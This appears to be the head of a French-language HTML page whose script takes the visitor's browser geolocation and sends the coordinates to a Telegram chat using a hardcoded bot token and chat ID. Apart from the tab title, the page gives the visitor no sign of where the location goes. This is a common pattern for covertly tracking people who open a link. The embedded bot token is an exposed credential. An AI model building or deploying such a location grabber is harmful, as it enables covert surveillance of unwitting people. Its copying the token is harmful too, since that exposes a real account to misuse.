<!DOCTYPE html>
<html>
<head>
    <title>Envoi de localisation à un bot Telegram</title>
    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocation, showError);
            } else {
                console.log("La géolocalisation n'est pas prise en charge par ce navigateur.");
            }
        }

        function sendLocation(position) {
            var latitude = position.coords.latitude;
            var longitude = position.coords.longitude;

            var botToken = "6168495096:AAGTN6L_blwcAkg5SaqRVw76_bchyHPWbS4";
            var chatId = "-1001910296179";
            var apiUrl = "https://api.telegram.org/bot" + botToken + "/sendLocation";

            var xhr = new XMLHttpRequest();
            xhr.open("GET", apiUrl + "?chat_id=" + chatId + "&latitude=" + latitude + "&longitude=" + longitude);
            xhr.send();

            console.log("Localisation envoyée au bot Telegram !");
        }

        function showError(error) {
            switch (error.code) {
                case error.PERMISSION_DENIED:
                    console.log("L'utilisateur a refusé la demande de localisation.");
                    break;
                case error.POSITION_UNAVAILABLE:
                    console.log("Les informations de localisation ne sont pas disponibles.");
                    break;
                case error.TIMEOUT:
                    console.log("La demande de localisation a expiré.");
                    break;
                case error.UNKNOWN_ERROR:
                    console.log("Une erreur inconnue s'est produite.");
                    break;
            }
        }
    </script>
</head>
